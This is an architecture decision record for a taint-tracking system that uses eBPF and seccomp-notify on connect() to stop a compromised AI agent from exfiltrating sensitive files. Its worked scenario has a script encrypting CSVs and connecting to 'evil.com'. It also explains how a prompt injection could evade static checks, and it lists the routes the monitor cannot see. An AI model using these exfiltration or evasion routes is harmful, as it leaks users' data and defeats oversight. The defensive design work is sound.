---
artifact: ADR-002
title: "Taint-and-Verify Data Flow Model"
status: Accepted
author: cristos
created: 2026-02-23
last-updated: 2026-03-11
affected-artifacts:
  - VISION-001
  - ADR-001
linked-epics: []
linked-specs: []
depends-on: []
---
# ADR-002: Taint-and-Verify Data Flow Model

## Lifecycle

| Phase | Date | Commit | Notes |
|-------|------|--------|-------|
| Proposed | 2026-02-23 | 94efd00 | From L1 coverage gap spike + data flow taint model spike + journal architecture investigation |
| Accepted | 2026-03-11 | — | Accepted as architectural decision |

## Context

ADR-001 established seccomp-notify on `execve` as the L1 enforcement mechanism, with a command evaluator that would parse scripts, resolve file references, and detect encoding patterns before execution. An adversarial review and subsequent investigation (spikes: `l1-interpreter-coverage-gap.md`, `data-flow-taint-model.md`) revealed that:

1. **Static analysis of commands is weak when tg-scanner is OSS.** The detection vocabulary (encoding patterns, exfiltration indicators) is public. A prompt injection can list identifiers to avoid. Static analysis becomes a speed bump, not a barrier.

2. **The three layers need a shared reasoning framework.** Each layer was designed independently around its interception point. But the threat is a *data flow*: sensitive data enters the agent's reach through an input channel, possibly transforms, and exits through an output channel. Without a model of how data flows through the system, we can't reason about coverage gaps or layer coordination.

3. **Runtime observation of actual file access is more robust than pre-execution static analysis.** The kernel observes the actual `openat` syscall regardless of how obfuscated the code is. No parsing, no pattern matching on source code, no evasion surface.

This ADR supersedes ADR-001. The seccomp-notify mechanism is retained but applied to `connect()` (network enforcement) instead of `execve` (command analysis). The command evaluator is dropped entirely.

### The scenarios that drove this decision

**Scenario A — Legitimate work with incidental sensitive data:**
An uncompromised agent reads CSV files to find transactions (as requested by the user). One file contains a credit card number. The agent summarizes: "Found 47 transactions totaling $12,500." The credit card number is never used.

- L1 should ALLOW the file read (blocking it breaks the legitimate work).
- L2 should ALLOW the MCP tool call (the summary doesn't contain the card number).
- If the agent accidentally includes the card number, L2 catches it and returns a shaped deny. The agent adjusts.

**Scenario B — Compromised agent encrypts before exfiltrating:**
A compromised agent writes a Python script that reads all CSVs, encrypts them into `archive.enc`, and attempts to exfiltrate through an allowed domain.

- Without taint tracking: The script runs. `archive.enc` is created. L2/L3 scan the encrypted blob — no patterns detected. **Exfiltration succeeds.**
- With taint tracking: The script opens `secret.csv` (observed by eBPF). Scanner daemon flags the file as sensitive. PID is tainted. Script calls `connect()` → seccomp-notify blocks the connection. **Exfiltration blocked.**

Scenario A shows that blocking reads of sensitive data breaks legitimate work — taint can't mean "block everything." Scenario B shows that independent output scanning fails against encryption — runtime taint tracking is needed to connect file access to network egress.

### The gap

Between "a process accessed sensitive files" and "L2/L3 can't see through encryption," there is no defense without runtime taint tracking. The question: how do we connect knowledge of file access to enforcement at network egress?

### What we investigated

We explored several approaches before arriving at the journal-based architecture:

1. **Cross-layer taint sharing (L1 notifies L2/L3)**: tg-scanner notifies the gateway "this session has accessed sensitive data." Gateway applies the opaque-output rule. **Problem: impedance mismatch.** tg-scanner operates at PID level (syscall interception). L2/L3 operate at HTTP/MCP protocol level. There is no natural join key between "PID 4523 read secret.csv" and "this MCP request contains an encrypted blob." No shared session concept exists between syscall-level and protocol-level interception without significant new infrastructure.

2. **eBPF as cross-layer bridge**: Use eBPF to correlate file reads with network writes at the kernel level. **Problem: same impedance mismatch.** eBPF observes PIDs reading files and PIDs calling `connect()`, but can't determine which MCP request a connection carries. eBPF could bypass L2 entirely and enforce at connect-time, but then it's a two-signal check (read + send) without the three-factor correlation (taint + encoding + network) needed to avoid false positives.

3. **Expand seccomp-notify to network syscalls**: Intercept `sendto`/`sendmsg` to scan outbound data from tainted PIDs. **Problem: performance.** seccomp-notify costs ~5-7 microseconds per intercepted syscall (two context switches). `sendto` fires thousands of times per second during normal HTTP traffic. Performance cliff is catastrophic. Additionally, TOCTOU on send buffers is worse than on `execve` args — the kernel reads the buffer after the syscall resumes, so the buffer contents can change between scanning and actual send. Mitigation requires syscall emulation (tg-scanner sends the data itself), which is fragile.

4. **seccomp-notify on `connect()` only**: Intercept TCP connection establishment, not data transmission. `connect()` fires once per TCP connection — low frequency, practical overhead. **But**: at connect-time, no data has been sent yet. tg-scanner knows a tainted PID is connecting but can't inspect the payload. This is useful as an enforcement point but needs a data source — it needs to know *whether this PID is tainted*.

5. **The taint data source problem**: Setting taint at `execve` time depends on static analysis of the script being executed. If the script obfuscates file references, tg-scanner doesn't detect sensitive file access, doesn't set taint, and connect() enforcement doesn't fire. **tg-scanner is OSS**, so the detection vocabulary is public — a prompt injection can list identifiers to avoid. Static analysis becomes a speed bump, not a barrier. Runtime observation of actual file access is needed.

6. **Journal-based architecture**: The insight that resolved the investigation. See Decision below.

## Decision

Adopt a **taint-and-verify** data flow model with a **journal-based runtime taint architecture**. The journal tracks which processes access which files at runtime (not via static analysis). seccomp-notify on `connect()` acts as a synchronization barrier — pausing the thread until the scanner has caught up with pending file-access events.

### The rule

> Tainted data is not forbidden from leaving. It is forbidden from leaving *without inspection*.
>
> - **Inspectable output** from a tainted process → scan normally. If scanning passes, allow.
> - **Opaque output** (encrypted, heavily encoded, binary) from a tainted process → block. Cannot verify it's safe.

### Architecture: three components

**1. eBPF on `openat` — Event logging (nanosecond overhead, non-blocking)**

Lightweight eBPF program attached to the `openat` syscall. Logs `{pid, file_path, timestamp}` to a BPF ring buffer. Does not block, does not analyze, does not enforce. Pure observation.

Why eBPF: lowest overhead mechanism for observing syscalls without blocking the calling process. Could be replaced by fanotify or inotify (both can watch file opens), but eBPF has the most flexible filtering and lowest per-event cost. The observation mechanism is not security-critical — it feeds the journal, but enforcement is via seccomp-notify.

**2. Scanner daemon — Async analysis (millisecond latency, in tg-scanner)**

A daemon process in the tg-scanner container reads events from the eBPF ring buffer, reads the actual file contents from the shared read-only workspace volume, and runs the scanner (`{value} → {allow/deny}`). Updates a taint table:

```
taint_table[pid] = {
  tainted: bool,
  scanned_through_seq: uint64,  // journal sequence number
  sensitive_files: [path, ...]
}
```

Scanner processing is async — it runs at its own pace, behind real-time file access. This is acceptable because enforcement happens at connect-time, which waits for the scanner to catch up.

**3. seccomp-notify on `connect()` — Synchronization barrier + enforcement**

The seccomp-notify filter intercepts `connect()` (and `connect` variants). When a process attempts a TCP connection:

1. Kernel pauses the thread (seccomp-notify behavior — the thread blocks until tg-scanner responds).
2. tg-scanner checks: has the scanner daemon processed all pending `openat` events for this PID? If not, **wait** until it catches up. The paused thread provides natural backpressure — no race condition.
3. Once caught up: check `taint_table[pid]`. If tainted → DENY (`EPERM`). If clean → ALLOW.

This is the key insight: `connect()` via seccomp-notify **pauses the calling thread**, creating a natural synchronization barrier. The scanner can be async, and enforcement still happens before any data leaves.

### How the components interact

```
                    eBPF (openat)
                         │
                         │ {pid, path, seq}
                         ▼
                    ring buffer
                         │
                         ▼
              scanner daemon (async)
              reads files from workspace
              runs scanner ({value} → allow/deny)
                         │
                         ▼
                   taint table
                  {pid → tainted?}
                         │
                         ▼
                  seccomp-notify
                  on connect()
                  (sync barrier:
                   wait for scanner,
                   check taint,
                   ALLOW or EPERM)
```

For Scenario B (encrypted archive):

1. Compromised agent executes obfuscated Python script. The script runs — no `execve` interception to stop it.
2. Script calls `open("secret.csv")` → eBPF logs `{pid=4523, path="secret.csv", seq=1847}` to ring buffer.
3. Scanner daemon picks up event, reads `secret.csv` from workspace, scanner returns `{allow: false, reason: "credit card number"}` → sets `taint_table[4523] = {tainted: true}`.
4. Script creates `archive.enc` (encrypted — L2/L3 can't see through this).
5. Script calls `connect("evil.com:443")` → seccomp-notify fires, thread paused.
6. tg-scanner checks: scanner has processed through seq 1847 for PID 4523. PID is tainted. → DENY (`EPERM`).
7. Connection never established. Exfiltration blocked. The encryption was irrelevant — taint was set by the file open, not by analyzing the script.

### Taint lifecycle

**Taint source:** The scanner determines sensitivity. When the scanner daemon reads a file and the scanner returns `{allow: false}`, the file is sensitive. Any PID that opened a sensitive file is tainted.

**Taint propagation:**
- PID opens a sensitive file → PID is tainted (from scanner analysis)
- Tainted PID creates a file → file inherits taint (provenance tracking via journal: eBPF logs the write, scanner daemon marks the new file as tainted-by-provenance)
- Another PID opens a tainted-by-provenance file → that PID is tainted (transitive)

**Taint sink:** `connect()` syscall. The taint-and-verify rule applies: tainted PID attempting network access → DENY.

**Taint decay:** A PID stays tainted until it exits. Within a session, taint does not decay — the LLM's context window means sensitive data may persist in the agent's memory across tool calls. Cross-session taint (via agent memory) is a separate concern (see residual risks).

**Interaction with L2/L3:** The journal-based taint architecture operates entirely within tg-scanner (L1). L2 (MCP gateway) and L3 (agent-proxy) continue to scan independently at protocol boundaries. The impedance mismatch between PID-level and protocol-level enforcement means L1 and L2/L3 do not share taint state at runtime. Each layer covers different segments of the data flow graph:

- L1 (tg-scanner): catches encode-before-exfiltrate by blocking tainted PIDs from connecting. Works regardless of encoding.
- L2 (gateway): catches sensitive data that arrives at MCP tool call boundaries in recognizable form. Blind to encoded data, but doesn't need taint — pattern matching is sufficient for cleartext.
- L3 (proxy): same as L2 for HTTP traffic.

### Layer responsibilities under the taint model

| Layer | Role | Taint interaction |
|---|---|---|
| **L1 (eBPF on openat + scanner daemon)** | Runtime file access observation and scanning. | **Sets taint**: if PID opens a file the scanner flags as sensitive, PID is tainted. |
| **L1 (seccomp-notify on connect)** | Network access enforcement for tainted PIDs. | **Enforces taint**: waits for scanner to catch up, checks taint table, blocks tainted PIDs from connecting. |
| **L2 (MCP gateway)** | Scans all MCP tool call parameter values and responses. | **Independent**: no taint interaction. Pattern scanning on protocol content. |
| **L3 (agent-proxy)** | Scans skill HTTP request/response bodies. | **Independent**: no taint interaction. Pattern scanning on protocol content. |

### Input-output coverage matrix

Each cell shows which layer(s) can detect data flowing from that input to that output. **Bold** = primary layer for that pair.

| | MCP tool params | Skill HTTP | LLM API | Bash → network |
|---|---|---|---|---|
| **Workspace files** | **L1** (taint) + L2 (pattern) | **L1** (taint) + L3 (pattern) | **L1** (taint) | **L1** (taint) |
| **MCP responses** | **L2** (both directions) | L3 (pattern) | — | L1 (taint on file intermediary) |
| **HTTP responses** | L2 (pattern) | **L3** (both directions) | — | L1 (taint on file intermediary) |
| **Conversation context** | L2 (limited) | L3 (limited) | — | — |
| **Env vars** | L2 (credential prefix) | L3 (credential prefix) | — | — |

Key findings:
- **L1 observes the source, not the output.** By tracking which PIDs open which files, L1 knows what sensitive data a process has accessed — regardless of what it does with that data afterward. This is fundamentally different from L2/L3 pattern matching on output.
- **L2 and L3 scan the output, not the source.** They catch sensitive data that arrives at protocol boundaries still in recognizable form. Blind to encoded/encrypted data.
- **LLM API is a blind spot** (CONNECT passthrough). L1 taint enforcement partially mitigates: tainted child-process PIDs can't connect to the LLM API either. But the agent framework itself (not a child process) makes LLM API calls, and it may already have sensitive data in its context.
- **Env vars and conversation context have no L1 coverage.** L1 taint tracks file access, not environment variable reads or LLM context. These are covered only by L2/L3 pattern scanning (credential prefix detection).
- **Each layer is primary for different input-output pairs.** Not three redundant output scanners.

### Three propagation modes

| Mode | Example | Detectable? |
|---|---|---|
| **Syntactic** | File content piped through `base64` then `curl` | L1: taint on file open → connect blocked. Encoding is irrelevant — taint is set by the file access, not by analyzing the encoding. |
| **Protocol** | Agent passes file content as MCP tool parameter | L2 (scans parameter values). Pattern matching works if data is not encoded. L1 taint applies if the agent process read the file directly. |
| **Semantic** | Agent reads file, LLM summarizes it, summary sent via MCP | **Undetectable by any pattern-based system.** The LLM transforms structured data into natural language. Fundamental limit. |

Semantic propagation is a residual risk. L1 taint enforcement blocks child processes that read sensitive files from connecting out. But if the data enters the LLM's context (via the agent framework process, which is outside taint enforcement scope — see residual risk #2), semantic rephrasing defeats all pattern-based detection.

## Alternatives Considered

### Independent layers only (no taint tracking)

Each layer scans independently. No shared state. This is the pre-ADR-002 architecture.

**Rejected as complete solution because**: Scenario B demonstrates that encryption defeats all pattern-based scanning. Without taint tracking, no layer catches the encrypted archive.

**Retained as the baseline**: Independent scanning is still the primary mechanism for L2 and L3. Taint tracking adds a second basis for denial within L1, not a replacement for protocol-level scanning.

### Cross-layer taint sharing (L1 notifies L2/L3)

tg-scanner notifies the MCP gateway and agent-proxy when a session accesses sensitive data. L2/L3 apply the opaque-output rule.

**Rejected because of impedance mismatch**: tg-scanner operates at PID level, L2/L3 at protocol level. There is no natural join key. Options explored:
- Container-level taint (too coarse: one tainted process taints everything).
- Content-addressable taint (hash sensitive values, check output: precise, but encrypted data won't match).
- Session concept (new infrastructure to map PIDs to MCP/HTTP sessions: complex, fragile).

The journal-based approach sidesteps the impedance mismatch entirely: taint enforcement stays within L1, at the `connect()` syscall, where PID identity is available.

### eBPF as primary enforcement mechanism

Use eBPF (Tetragon) to both observe and enforce — blocking network writes from tainted PIDs at the kernel level.

**Rejected because**: eBPF enforcement faces the same limitations as eBPF analysis: 512-byte stack, 1M instruction budget, can't call userspace functions. Enforcement decisions (is this PID tainted? has the scanner caught up?) require userspace logic and potentially waiting for async processing. seccomp-notify provides the natural synchronization barrier that eBPF cannot.

**Adopted for observation only**: eBPF on `openat` is the lowest-overhead mechanism for logging file access events. It feeds the journal but makes no enforcement decisions.

### seccomp-notify on `execve` with command evaluator (ADR-001)

Intercept every `execve` syscall. tg-scanner reads the script source, parses it for encoding/exfiltration patterns, resolves file references (globs), scans referenced files, and blocks execution if sensitive data + encoding intent is detected.

**Superseded because**:
- **Static analysis is weak when OSS.** tg-scanner's source is public. Detection patterns (encoding indicators, exfiltration keywords, suspicious imports) are enumerable. A prompt injection can craft scripts that avoid all flagged identifiers.
- **Command evaluator is the most complex planned component.** Script parsing, glob resolution, encoding pattern detection across Python/Node.js/shell — high implementation cost and large attack surface.
- **The journal architecture handles the same threat better.** Runtime observation of actual file access (eBPF `openat`) doesn't depend on understanding the script — the kernel observes the syscall regardless of obfuscation. `connect()` enforcement blocks tainted PIDs without needing to analyze the command.
- **Sabotage prevention (the other `execve` use case) is handled by containerization.** Read-only filesystems, mounted directories, backups, and container isolation are the right controls for destructive commands — not command validation.

See [ADR-001 (superseded)](../superseded/(ADR-001)-Seccomp-Notify-L1-Interception.md) for the full original decision record.

### Expand seccomp-notify to `sendto`/`sendmsg`

Intercept data-sending syscalls to scan outbound data from tainted PIDs.

**Rejected because of performance**: `sendto`/`sendmsg` fire thousands of times per second during normal HTTP traffic. At ~5-7 microseconds per seccomp-notify round-trip (two context switches), intercepting every send would cause catastrophic performance degradation. Additionally, TOCTOU on send buffers is severe — the kernel reads the buffer after the syscall resumes, so buffer contents can change between tg-scanner's scan and the actual send. Mitigation requires syscall emulation (tg-scanner sends the data itself via `SECCOMP_IOCTL_NOTIF_ADDFD`), which is fragile and complex.

`connect()` interception avoids both problems: fires once per TCP connection (low frequency, practical overhead), and the enforcement decision (allow/deny) is made before any data is sent (no TOCTOU on payload).

### Taint-and-block (block all output from tainted processes)

Any process that has read a sensitive file is blocked from all network access.

**Rejected because**: Scenario A demonstrates this breaks legitimate work. The agent needs to read sensitive files to do its job. It needs network access to call MCP tools and APIs. Blanket blocking is unusable.

The taint-and-verify rule refines this: tainted processes can produce *inspectable* output (which L2/L3 scan at protocol boundaries). Only opaque output is blocked — and in the journal-based architecture, `connect()` enforcement blocks the connection entirely for tainted PIDs, since we can't distinguish inspectable from opaque at the TCP level.

**Open question**: This means tainted PIDs are effectively blocked from *all* network access (connect enforcement doesn't know whether the subsequent traffic will be inspectable JSON or an encrypted blob). In practice, child processes spawned by the agent to run scripts (Python, Node.js) would be blocked from connecting out after reading sensitive files. The agent framework process itself makes connections through a different code path (direct HTTP client, not child process → connect). This distinction may be sufficient for most scenarios, but needs validation during implementation.

### LSM hooks for file access observation

Use Linux Security Module hooks (e.g., `file_open`) instead of or alongside eBPF on `openat`. LSM hooks provide better semantics — `file_open` fires after path resolution, so the logged path is canonical (no symlink/relative path TOCTOU).

**Not rejected but deferred**: LSM hooks via BPF (BPF_PROG_TYPE_LSM, available since Linux 5.7) would provide TOCTOU-free path logging. However:
- Docker Desktop's LinuxKit kernel may lack `CONFIG_BPF_LSM`.
- LSM hooks run in-kernel and cannot wait for userspace processing (same limitation as eBPF for enforcement).
- Traditional LSM (SELinux MLS labels) is conceptually close to taint tracking but operationally complex.

LSM hooks could improve the event logging component (replacing eBPF on `openat` with LSM `file_open` for better path resolution), but they don't change the architecture. The enforcement mechanism (seccomp-notify on `connect`) and synchronization design (journal + scanner daemon) remain the same.

### Content-addressable taint (hash sensitive values, check output for matches)

Hash sensitive values at read time. Check outgoing data for matching hashes.

**Not rejected but deferred**: Hashing specific sensitive values (credit card numbers, API keys) and checking output for exact or near-matches could enable more precise enforcement at L2/L3 (solving the impedance mismatch for a subset of threats). Requires the scanner to emit specific tainted values, not just allow/deny. Compatible with the taint-and-verify model; worth exploring after the journal-based architecture is implemented.

## Consequences

### Positive

- **Covers the encryption gap**: Runtime taint tracking blocks network access from PIDs that read sensitive files, regardless of what the PID does with the data (encrypt, encode, obfuscate). No static analysis of the encoding step needed.
- **Doesn't depend on static analysis for taint detection**: eBPF observes actual `openat` syscalls, not static analysis of scripts. tg-scanner being OSS doesn't help an attacker avoid taint — the kernel observes the actual file open, not the code that triggers it.
- **Natural synchronization via seccomp-notify**: `connect()` pauses the thread, providing a race-free enforcement point. No polling, no locks, no event queue coordination. The kernel provides the synchronization primitive.
- **Each component in its optimal role**: eBPF for lightweight observation (nanoseconds, non-blocking), scanner for complex analysis (milliseconds, async), seccomp-notify for enforcement (synchronous, blocks until decision).
- **Doesn't break legitimate work**: The agent framework process itself makes MCP/HTTP calls through persistent connections (already established before sensitive file access). Child processes spawned to run scripts are the primary enforcement target. Taint at connect-time is precise enough for the encode-before-exfiltrate threat.
- **Simpler than ADR-001**: No command evaluator, no script parser, no glob resolver, no encoding pattern detection. tg-scanner contains three focused components (eBPF loader, scanner daemon, connect enforcer) instead of a complex command analysis engine. Smaller attack surface, faster to implement.

### Negative

- **eBPF deployment complexity**: Requires eBPF support in the kernel. Docker Desktop's LinuxKit VM provides this, but native Linux hosts need kernel 4.18+ (ring buffer) or 5.8+ (BPF ring buffer). Adds a privileged component for loading the eBPF program.
- **Tainted PIDs lose all network access**: `connect()` enforcement can't distinguish "will send inspectable JSON" from "will send encrypted blob." This is coarser than the ideal taint-and-verify rule. In practice, script child processes (Python, Node.js) are the enforcement target, and their network access is typically for exfiltration, not legitimate API calls. But edge cases exist.
- **Scanner daemon latency**: If a process opens a file and immediately calls `connect()`, the scanner daemon may not have processed the `openat` event yet. seccomp-notify on `connect()` blocks until the scanner catches up — this adds latency to the `connect()` call equal to the scanner processing time. Acceptable for script-level network access, could be noticeable for rapid connection patterns.
- **Taint explosion**: If the agent opens many files early in a session, most child processes inherit taint, and connect-enforcement becomes effectively "block all child process network access." Needs calibration — perhaps only high-confidence sensitive data (L2 patterns: credit cards, credentials) sets taint, not low-confidence (L3: entropy).
- **Semantic propagation remains unaddressed**: The LLM as a semantic taint propagator defeats all syntactic/pattern-based detection. The agent reads a sensitive file via a child process (which gets tainted and blocked from connecting), but the file contents are now in the LLM's context, and the agent framework process (not tainted at PID level) sends them onward. Fundamental limit.
- **macOS development**: eBPF requires Linux. Docker Desktop provides a Linux VM, but the development experience for eBPF programs (loading, debugging) on macOS-via-Docker-Desktop needs validation.

### Residual risks

1. **Semantic propagation through the LLM**: Agent reads sensitive file (PID tainted, blocked from connecting), but data enters LLM context. Agent framework process summarizes it and exfiltrates via MCP/HTTP. Only L2/L3 pattern scanning defends this path — and semantic rephrasing defeats patterns. Fundamental limit.
2. **Agent framework process taint**: The agent framework process (PID 1 in the container) reads files directly (not via child process). It also makes network connections for MCP and LLM calls. Tainting PID 1 blocks all agent functionality. Need to distinguish framework-level file reads from script-level file reads, or accept that the framework process is outside taint enforcement scope.
3. **Cross-session taint via agent memory**: Sensitive data from session 1 persists in agent memory and influences session 2. PID-based taint doesn't cross sessions. Requires session-level or memory-level taint tracking (see `agent-memory-exfiltration.md` spike).
4. **Taint explosion**: Many files flagged as sensitive → most PIDs tainted → connect enforcement becomes too broad. Calibration needed: taint only on high-confidence sensitive data.
5. **TOCTOU between file open observation and file scan**: eBPF logs `openat`, scanner daemon reads the file later. File could change between open and scan. Mitigated by: shared volume is read-only for tg-scanner (it reads a consistent snapshot), but the agent container has write access. See `workspace-volume-toctou.md` spike.
6. **eBPF availability**: Not all deployment environments support eBPF (older kernels, restricted VM hosts, some container platforms). Graceful degradation options:
   - **Without eBPF or fallback**: No taint tracking. `connect()` enforcement has no taint signal and must allow all connections. L2/L3 pattern scanning is the only defense. Encrypted exfiltration succeeds.
   - **seccomp-notify on `openat` as fallback**: If eBPF is unavailable, `openat` can be added to the seccomp-notify filter instead. Functionally equivalent (tg-scanner observes every file open, scans, updates taint table), but with significant performance cost (~5-7us per file open, blocking). Acceptable for low-I/O workloads, problematic for heavy file access patterns (Node.js module loading, Python imports). Worth offering as a configuration option for restricted environments.

### Requirements

| Component | Minimum Version | Purpose |
|---|---|---|
| Linux kernel | 5.8+ | BPF ring buffer for event logging |
| runc | 1.1.0+ | seccomp-notify + `listenerPath` support |
| Docker | >= 25.0.5 | CVE-2024-29018 fix, ships runc 1.1+ |
| libseccomp | 2.5.0+ | `SCMP_ACT_NOTIFY` support |
| Shared workspace volume | Read-only mount in tg-scanner | Scanner daemon reads files independently |

Note: No Tetragon dependency. The eBPF program for `openat` logging is simple enough to load directly via `cilium/ebpf` (Go library) or `libbpf`. Full Tetragon is not required.

### Implementation sequence

1. **L2 + L3 independent**: MCP gateway and agent-proxy scan independently. No taint tracking. This provides strong coverage for non-encrypted exfiltration.
2. **seccomp-notify on `connect()`**: OCI runtime wrapper injects seccomp-notify filter for `connect`. tg-scanner allows all connections initially (pass-through). Infrastructure in place, enforcement off.
3. **eBPF event logging**: Load a minimal eBPF program on `openat`. Log `{pid, path, seq}` to ring buffer. Scanner daemon reads events and updates taint table. No enforcement yet — observation only.
4. **Connect enforcement**: tg-scanner checks taint table on `connect()`. Tainted PID → DENY. Scanner daemon must be caught up (wait for `scanned_through_seq >= pending_seq`). This closes the encryption gap.
5. **File provenance tracking**: Files written by tainted PIDs inherit taint via journal. Subsequent processes opening tainted files are also tainted. Catches multi-step exfiltration (process A reads sensitive file → writes intermediate → process B reads intermediate → connects).
6. **Calibration**: Tune which scanner findings set taint (high-confidence L2 patterns only vs. all findings). Monitor taint explosion in real workloads. Adjust.
